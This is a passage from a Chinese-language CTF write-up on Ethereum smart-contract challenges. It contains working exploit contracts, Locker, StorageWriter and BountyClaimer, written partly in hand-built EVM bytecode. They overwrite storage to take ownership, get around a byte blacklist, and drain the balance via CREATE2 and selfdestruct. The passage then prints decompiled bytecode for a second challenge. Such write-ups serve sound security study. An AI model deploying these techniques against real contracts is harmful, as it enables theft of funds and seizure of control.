当满足上述的三种条件后flag就很容易获得了。
以下合约为攻击合约，且将通过将存储0x00的值来锁定CTF，并将所有权转移到自己的地址。
    contract StorageWriter {
        constructor() public payable {
            assembly {
                mstore(0x00, 0x348055327f0b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fc)
                mstore(0x20, 0xbe2b7fa0cf601002600601550000000000000000000000000000000000000000)
                return(0x00, 0x40)
            }
        }
    }
    /**
     * Locks the contract so no one else can take ownership
     */
    contract Locker {
        CTFAPI private constant CTF = CTFAPI(0x68Cb858247ef5c4A0D0Cde9d6F68Dce93e49c02A);
        constructor() public payable {
            require(tx.origin == 0x5CD5e9e5D251bF23c7238d1972e45A707594F2A0);
            bool result;
            // First, make this contract the owner
            (result, ) = address(CTF).call(abi.encodeWithSelector(
                0x4214352d,
                uint(address(this)),
                uint(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)
            ));
            require(result);
            // Second, create the storage writer contract
            StorageWriter locker = new StorageWriter();
            (result, ) = address(CTF).call(abi.encodeWithSelector(
                0x2918435f,
                locker
            ));
            require(result);
            // Third, check result
            require(CTF.owners(0) == tx.origin);
            // Fourth, cleanup
            selfdestruct(tx.origin);
        }
    }
`StorageWriter`合约是用汇编语言编写的，伪代码如下所示。
    contract StorageWriter {
        uint[] private someArray;
        address[] private owners;
        function() public payable {
            someArray.length = 0;
            owners[0] = tx.origin;
        }
    }
这里有两点需要注意。
  * StorageWriter合同实现需要手写。 这是因为这里的沙箱允许使用特定的字节，而不是特定的操作码。 这意味着即使在常量值的上下文中也禁止`0xFA`。
Locker部署在`0x8cd8cc3969f4800257eac48b46e01190477e4cb60d877a50532613db4e32b663`上。
它成功锁定合约并将所有权转让给`0x5cd5e9e5d251bf23c7238d1972e45a707594f2a0`。
    contract BountyClaimer {
        constructor() public payable {
            assembly {
                mstore(0x00, 0x6132fe6001013452346004601c3031f5)
                return(0x10, 0x20)
            }
        }
    }
这个合同也是用汇编语言编写的，所以伪代码在下面给出。
    contract BountyClaimerInner {
        constructor() public payable {
            selfdestruct(tx.origin);
        }
    }
    contract BountyClaimer {
        function() public payable {
            (new BountyClaimerInner).value(address(this).balance)();
        }
    }
`BountyClaimer`合约使用`CREATE2`创建另一个合同，其中包含函数`selfdestruct(tx.origin)`。
为了绕过字节0xFF上的黑名单，程序集实际上创建了一个0x32FE + 0x01的合约。
### 题目二
第二道题目部署到[0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87](https://ethstats.io/account/0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87)上。
然而，许多反编译器无法对其进行编译操作，所以我们借助上文中的编辑器进行反汇编操作。
    // Decompiled at www.contract-library.com
    // Data structures and variables inferred from the use of storage instructions
    uint256 unknown; // 0x0
    uint256 die; // 0x20
    // Note: The function selector is not present in the original solidity code.
    // However, we display it for the sake of completeness.
    function __function_selector__(uint32 function_selector) public {
      MEM[0x40] = 0x100000;
      if ((msg.data.length() >= 0x4)) {
        if ((0x7909947a == function_selector)) 0x7909947a(function_selector);
        if ((0x60fe47b1 == function_selector)) set(uint256)(function_selector);
        if ((0x6d4ce63c == function_selector)) get()();
        v00x5f = (0x35f46994 == v00x37);
        if (v00x5f) die()();
      }
      throw();
    }
    function 0x7909947a() public {
      MEM[0x100] = 0x100;
      0x8c(0x0, 0x24c);
      0x8c(0x0, 0x25a);
      CALLDATACOPY(0x90000, 0x44, msg.data.length());
      v269_0, v269_1, v269_2 = 0xb4(0x26a);
      0x8c(0x29b, 0x275);
      0x8c(0x90000, 0x281);
      0x8c(v269_0, 0x28a);
      0x8c((msg.data.length() - 0x44), 0x296);
      0x8c(0x0, 0x167);
      while (true) {
        if (!(MEM[MEM[0x100]] - MEM[(MEM[0x100] - 0x20)])) break;
        MEM8[(MEM[(MEM[0x100] - 0x40)] + MEM[MEM[0x100]])] = MEM[(MEM[(MEM[0x100] - 0x60)] + MEM[MEM[0x100]])] >> 248 & 0xFF;
        MEM[MEM[0x100]] = (MEM[MEM[0x100]] + 0x1);
        continue;
      }
      MEM8[(MEM[(MEM[0x100] - 0x40)] + MEM[MEM[0x100]])] = 0x0;
      while (true) {
        if (!(MEM[MEM[0x100]] % 0x40)) break;
        MEM8[(MEM[(MEM[0x100] - 0x40)] + MEM[MEM[0x100]])] = 0x0;
        MEM[MEM[0x100]] = (MEM[MEM[0x100]] + 0x1);
        continue;
      }
      v218_0 = set_impl(0x219);
      v221_0 = set_impl(0x222);
      v22a_0 = set_impl(0x22b);
      v233_0 = set_impl(0x234);
      0xc3();
    }
    function set(uint256 varg0) public {
      get_impl(0x317);
      v31e_0, v31e_1, v31e_2 = 0xb4(0x31f);
      0x8c(0x344, 0x32a);
      0x8c(varg0, 0x335);
      0x8c(0x0, 0x33f);
      STORAGE[MEM[MEM[0x100]]] = MEM[(MEM[0x100] - 0x20)];
      v2ff_0 = set_impl(0x300);
      v308_0 = set_impl(0x309);
      0xc3();
    }
    function get() public {
      get_impl(0x352);
      if ((msg.sender == unknown)) {
        throw();
      } else {
        MEM[0x80] = unknown;
        return(MEM[0x80:0xa0]);
      }
    }
    function die() public {
      if ((msg.sender != die)) {
        throw();
      } else {
        selfdestruct(die);
      }
    }
    function 0x8c(uint256 vg0, uint256 vg1) private {
      v93 = (MEM[0x100] + 0x20);
      MEM[0x100] = v93;
      MEM[v93] = vg0;
      return() // to vg1;
    }
    function set_impl(uint256 vg0) private {
      MEM[0x100] = (MEM[0x100] - 0x20);
      return(MEM[MEM[0x100]]) // to vg0;
    }
    function 0xb4(uint256 vg0) private {
      return() // to 0x8c;
    }
    function 0xc3(uint256 vg0) private {
      vca_0 = set_impl(0xcb);
      vd2_0 = set_impl(0xd3);
      MEM[0x100] = vc30xd2_0;
    }
    function get_impl(uint256 vg0) private {
      require(!msg.value);
      return() // to vg0;
    }